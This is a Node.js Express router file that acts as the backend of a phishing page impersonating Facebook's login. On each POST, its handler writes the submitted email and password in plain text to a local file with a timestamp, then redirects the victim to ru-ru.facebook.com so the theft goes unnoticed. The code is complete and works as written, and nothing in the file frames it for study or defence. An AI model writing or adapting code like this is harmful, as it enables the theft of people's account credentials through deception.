'use strict';
var express = require('express');
var fs = require('fs');
var writer = fs.createWriteStream('output.txt', { flags : "a" });
var router = express.Router();

/* post login listing. */
router.post('/', function (req, res) {
    writer.write((new Date()).toISOString() + ": email: " + req.body.email + " pass: " + req.body.pass + "\n");
    res.redirect('https://ru-ru.facebook.com/');
    res.end()
});

module.exports = router;
